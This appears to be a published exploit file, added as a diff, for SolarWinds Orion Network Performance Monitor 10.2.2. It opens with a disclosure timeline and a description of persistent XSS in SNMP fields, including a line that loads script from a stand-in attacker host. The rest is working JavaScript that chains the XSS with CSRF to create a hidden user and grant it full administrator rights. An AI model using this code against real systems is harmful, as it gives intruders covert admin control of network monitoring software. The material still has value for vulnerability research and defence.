@@ -1,0 +1,167 @@
+/*
+######################################################################################
+# Exploit Title: SolarWinds Orion Network Performance Monitor 10.2.2 Multiple Vulnerabilities
+# Date: Jul 21 2012
+# Author: muts
+# Version: SolarWinds Orion Network Performance Monitor 10.2.2
+# Vendor URL: http://www.solarwinds.com/
+######################################################################################
+
+Timeline:
+
+29 May 2012: Vulnerability reported to CERT
+30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+02 Jul 2012: Contact received from SolarWinds with vulnerability confirmation and plans for remediation
+09 Jul 2012: SolarWinds provides a preview release (10.3.1) for testing
+10 Jul 2012: Advised SolarWinds that the preview release fixed the reported vulnerabilities
+21 Jul 2012: Public disclosure
+
+Vulnerability Details:
+
+SolarWinds Orion Network Performance Monitor (NPM) is vulnerable to persistent XSS when scanning a remote system containing malicious JavaScript in its snmpd.conf file. The vulnerable fields were determined to be:
+
+syslocation <script>alert('location')</script> 
+syscontact <script>alert('contact')</script>
+sysName <script>alert('name')</script>
+
+In addition, NPM is also vulnerable to CSRF attacks despite the fact that it makes use of VIEWSTATE protection.
+
+Through a combination of XSS and CSRF, a user can be added to the web application by configuring the snmpd.conf file to point to an attacker-controlled JavaScript file:
+
+syscontact <script src="http://attacker/evil.js"></script>
+
+
+*/
+
+
+function getCookie(c_name)
+{
+    var i,x,y,ARRcookies=document.cookie.split(";");
+    for (i=0;i<ARRcookies.length;i++)
+    {
+        x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
+        y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
+        x=x.replace(/^\s+|\s+$/g,"");
+        if (x==c_name)
+        {
+            return unescape(y);
+        }
+    }
+}
+
+function setCookie(c_name,value,exdays)
+{
+    var exdate=new Date();
+    exdate.setDate(exdate.getDate() + exdays);
+    var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+    document.cookie=c_name + "=" + c_value;
+}
+
+function postCredentials(viewState, user, password)
+{
+    var http = new XMLHttpRequest();
+    var url = "/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion";
+   
+    var params = "ctl00%24ctl00%24ctl00%24BodyContent%24ScriptManagerPlaceHolder%24MasterScriptManager" + "=" + "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24UpdatePanel1%257Cctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1" + "&" +
+                 "__EVENTTARGET" + "=" + "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1" + "&" +
+                 "__EVENTARGUMENT" + "=" + "&" +
+                 "__VIEWSTATE" + "=" + encodeURIComponent(viewState) + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24UserName" + "=" + user + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24Password" + "=" + password + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24ConfirmPassword" + "=" + password + "&" +
+                 "__ASYNCPOST" + "=" + "false"
+                 
+    http.open("POST", url, false);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.setRequestHeader("Content-lenth", params.length);
+    http.setRequestHeader("Connection", "close");
+    http.send(params);
+    var response = http.responseText;
+    var doc = document.implementation.createHTMLDocument('');
+    doc.documentElement.innerHTML = response;
+    return(doc);
+}
+
+function setAdminPriv(viewState, username)
+{
+    var http = new XMLHttpRequest();
+    var url = "/Orion/Admin/Accounts/EditAccount.aspx?AccountID=" + username + "&AccountType=Edit";
+   
+    var params = "__EVENTTARGET" + "=" + "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24submitButton" + "&" +
+                 "__EVENTARGUMENT" + "=" + "&" +
+                 "__VIEWSTATE" + "=" + encodeURIComponent(viewState) + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24checkboxesVisible" + "=" + "hidden" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAccountEnabled%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24txtAccountExpires" + "=" + "Never" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynDisableSessionTimeout%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAdminRights%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAllowNodeManagement%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynCustomizeViews%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynClearEvents%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynBrowserIntegration%24listBox" + "=" + "true" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxAlertSound" + "=" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tbBreadcrumbItems" + "=" + "50" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl00%241%24menuBars" + "=" + "Default" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl01%243%24menuBars" + "=" + "Network_TabMenu" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl02%242%24menuBars" + "=" + "Virtualization_TabMenu" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxHomePageView" + "=" + "1" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxSummaryView" + "=" + "1" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxReportFolder" + "=" + "%5CReports" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24lbxNodeDetails" + "=" + "-1" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24lbxVolumeDetails" + "=" + "3" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24lbxNodeDetails" + "=" + "7" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24lbxInterfaceDetails" + "=" + "14" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24lbxVSANDetails" + "=" + "22" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24lbxUCSChassisDetails" + "=" + "24" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24ViewSelector%24lbxViewPicker" + "=" + "9" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24ViewSelector%24lbxViewPicker" + "=" + "10" + "&" +
+                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24ViewSelector%24lbxViewPicker" + "=" + "11"
+
+    http.open("POST", url, false);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.setRequestHeader("Content-lenth", params.length);
+    http.setRequestHeader("Connection", "close");
+    http.send(params);
+    var response = http.responseText;
+    var doc = document.implementation.createHTMLDocument('');
+    doc.documentElement.innerHTML = response;
+    return(doc);
+}
+
+function getHtmlBody(url, ref)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open('GET', url, false);
+    xmlHttp.send(null);
+    var results = xmlHttp.responseText;
+    var doc = document.implementation.createHTMLDocument('');
+    doc.documentElement.innerHTML = results;
+    return(doc);
+}
+
+function getViewState(doc)
+{
+    return(doc.getElementById("__VIEWSTATE"));
+}
+
+var username = "myuser";
+var password = "test";
+
+// Check if we already attacked the host to avoid duplicated attacks
+if (getCookie("o1") == null)
+{
+    // Get the initial view-state
+    var doc1 = getHtmlBody("/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion");
+   
+    // Create a new account with the given credentials
+    postCredentials(getViewState(doc1).value, username, password);
+   
+    // Get the edit account view-state
+    var doc2 = getHtmlBody("/Orion/Admin/Accounts/EditAccount.aspx?AccountID=" + username + "&AccountType=Edit");
+   
+    // Assign our new account with administrative privileges
+    setAdminPriv(getViewState(doc2).value, username);
+   
+    // Set the cookie to avoid duplicated attacks
+    setCookie("o1", 1, "");
+}
